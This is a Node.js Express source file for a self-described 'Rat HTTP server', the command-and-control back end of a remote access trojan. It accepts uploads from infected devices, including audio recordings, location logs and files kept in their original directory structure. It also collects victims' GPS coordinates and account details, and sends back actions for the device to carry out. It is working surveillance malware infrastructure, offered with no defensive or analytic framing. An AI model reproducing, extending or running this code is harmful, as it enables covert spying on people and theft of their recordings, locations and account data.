/*
 * Rat HTTP server
 *
 * TODO make an angular dashboard to control the connected devices
 */

var express = require('express');
var path = require('path');
var mongoose = require('mongoose');
var morgan = require('morgan');
var multer = require('multer');
var mkdirp = require('mkdirp');
var fs     = require('fs');

// The directory where each client dir is saved
var controlServerDirectory = '/../';
// The directory name inside the client dir
var clientMediaDirectory = 'recordings-and-location-logs';
// The max file size to accept from a client in bytes
var maxFileSize = 10 * 1024 * 1024;

var storage = multer.diskStorage({
    destination: function(req, file, callback) {
        // For use with the java rat server we... located in the parent directory
        // Thus we use /../ and save in the client id's directory
        // Ensure dir exists, it probabaly already exists when using java rat server
        mkdirp.sync(file.directory);
        callback(null, file.directory);
    },
    filename: function(req, file, callback) {
        // Save the file with the name it had on the client side
        callback(null, file.originalname);
    }
});
var upload = multer({
    storage: storage,
    limits: {
        // Filesize in bytes
        fileSize: maxFileSize
    },
    fileFilter: (req, file, callback) => {
        // Get file info from client
        var fileName = file.originalname;
        // Get our working directory and set it to the file object for use in 'storage'
        // If the path starts with data we are receiving a recording, log or kml file.
        if(req.body.clientPath.split(path.sep)[1] === 'data'){
            // Save it to the media folder
            file.directory = path.join(__dirname, controlServerDirectory, req.params.clientId, clientMediaDirectory);
        } else {
            // Otherwise save the file in the original directory structure
            file.directory = path.join(__dirname, controlServerDirectory, req.params.clientId, req.body.clientPath);
        }
        // Check if the file already exists
        fileExists(file.directory , fileName, (exists) => {
            if(exists){
                // File already exists, do not accept this upload
                var error = req.params.clientId + ' ' + fileName + ' exists ';
                callback(error, false);
            } else {
                // File does not exist, accept it
                console.log('%s Saving: %s to %s', req.params.clientId, fileName, file.directory);
                callback(null, true);
            }
        });
    }
    // The file identifier expected for the client, these must match
}).single('tehAwesomeFile');

var app = express();
var PORT_NUMBER = process.argv[2]; // to start: "node server.js [port]"

// Simple connection logger
// app.use(morgan(':date[clf] :remote-addr :url'));

// Host angular dashboard:
// app.use(express.static('rat-admin'));

/*
 * A client is uploading a file
 */
app.post('/postFile/:clientId', (req, res) => {
    upload(req, res, (err) => {
        if (err) {
            console.log(err);
            res.status(500).send(err);
        } else {
            res.status(200).send(req.file.originalname);
        }
    });
});

// Tell the client if we want to accept this file
app.get('/acceptFile/:clientId', (req, res) => {
    var fileName = req.query.fileName;
    var fileSize = req.query.fileSize;
    var clientPath = req.query.clientPath;
    var directory = path.join(__dirname, controlServerDirectory, req.query.clientId, clientPath);
    fileExists(directory, fileName, (exists) => {
        if(exists){
            res.status(500).send(fileName + ' Already exists on server');
        } else if (fileSize > maxFileSize){
            res.status(500).send(fileName + ' Too large');
        } else {
            res.status(200).send();
        }
    });
});

// Receive status and respond with actions to take on the client
app.get('/status/:clientId', (req, res) => {
    var clientId          = req.params.clientId;
    var isLocationStarted = req.query.isLocationStarted;
    var isAudioStarted    = req.query.isAudioStarted;
    var isWifiConnected   = req.query.isWifiConnected;

    connectionManager.addUpdate(clientId, isLocationStarted, isAudioStarted, isWifiConnected);
    res.send(connectionManager.getLastById(clientId).actions);
});

app.get('/updateAccountInfo/:clientId', (req, res) => {
    var connection = connectionManager.getLastById(req.params.clientId);
    for(var account in req.query){
        connection.accounts.push(req.query[account]);
    }
    res.send();
});

app.get('/updateLocation/:clientId', (req, res) => {
    var connection = connectionManager.getLastById(req.params.clientId);
    connection.location.lat = req.query.lat;
    connection.location.lng = req.query.lng;
    connection.location.accuracy = req.query.accuracy;
    connection.location.timestamp = req.query.timestamp;
    connection.location.provider = req.query.provider;
    res.send();
});

app.get('/connections', (req, res) => {
    res.send(JSON.stringify(connectionManager.connections, null, 4));
});

app.get('/serverStatus', (req, res) => {
    res.send("Online...");
});

function Connection(clientId, isLocationStarted, isAudioStarted, isWifiConnected) {
    this.clientId          = clientId;
    this.lastSeen          = new Date().getTime();
    this.isAudioStarted    = isLocationStarted;
    this.isLocationStarted = isAudioStarted;
    this.isWifiConnected   = isWifiConnected;
    // The client gets a response with actions to take each time it connects
    this.actions           = {
        // Set actions to take
    };
    this.location = {
        lat: '',
        lng: '',
        accuracy: '',
        timestamp: '',
        provider: ''
    };
    this.accounts = [];
    this.wifiConnections = {
    };

}

var connectionManager = {
    connections: [],
    addUpdate: function(clientId, isLocationStarted, isAudioStarted, isWifiConnected) {
        // Check if connection exists
        if (this.getLastById(clientId) === undefined) {
            this.connections.push(new Connection(clientId, isLocationStarted, isAudioStarted, isWifiConnected));
        } else {
            this.getLastById(clientId).lastSeen = new Date().getTime();
            this.getLastById(clientId).isLocationStarted = isLocationStarted;
            this.getLastById(clientId).isAudioStarted = isAudioStarted;
            this.getLastById(clientId).isWifiConnected = isWifiConnected;
        }
    },
    clean: function() {
        var timeout = 60000;
        for (var i = 1; i < connectionManager.connections.length; i++) {
            var count = 0;
            if (connectionManager.connections[i].lastSeen < (new Date().getTime() - timeout)) {
                var index = connectionManager.connections.indexOf(connectionManager.connections[i]);
                connectionManager.connections.splice(index, 1);
                count++;
            }
        }
    },
    getLastById: function(clientId) {
        for (var i = this.connections.length - 1; i >= 0; i--) {
            if (this.connections[i].clientId === clientId) {
                return this.connections[i];
            }
        }
    }
};

function fileExists(dir, fileName, callback) {
    fs.stat(path.join(dir, fileName), (err, stats) => {
        if (err === null) {
            callback(true);
        } else if (err.code === 'ENOENT') {
            callback(false);
        } else {
            console.log(err.code);
            callback(false);
        }
    });
}

// Clean dead connections
setInterval(connectionManager.clean, 60000);

// start the server
var server = app.listen(PORT_NUMBER, function() {
    var host = server.address().address;
    var port = server.address().port;

    console.log('listening at %s:%s', host, port);
});
